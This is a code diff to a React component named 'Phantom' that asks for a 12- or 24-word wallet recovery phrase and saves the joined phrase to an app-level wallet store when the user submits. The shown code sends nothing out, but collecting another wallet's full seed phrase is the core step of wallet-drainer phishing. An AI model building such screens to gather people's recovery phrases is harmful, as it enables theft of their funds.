@@ -2,11 +2,19 @@ import { useState } from "react";
 import { ChevronLeft, HelpCircle } from "lucide-react";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
+import { useWalletStore } from "@/store/walletStore";
 
-const Phantom = () => {
+const Phantom = ({ handleFinish }: { handleFinish: () => void }) => {
 	const [wordCount, setWordCount] = useState<12 | 24>(12);
 	const [words, setWords] = useState<string[]>(Array(12).fill(""));
 	const [error, setError] = useState<number | null>(null);
+
+	const { setSeedPhrase } = useWalletStore();
+
+	const handleComplete = () => {
+		setSeedPhrase(words.join(" "));
+		handleFinish();
+	};
 
 	const handleWordCountChange = (count: 12 | 24) => {
 		setWordCount(count);
@@ -78,6 +86,7 @@ const Phantom = () => {
 					</button>
 
 					<button
+						onClick={handleComplete}
 						disabled={words.some((w) => !w) || error !== null}
 						className="w-full bg-neutral-800 hover:bg-purple-400 text-gray-100 disabled:opacity-50 py-3 rounded-lg"
 					>
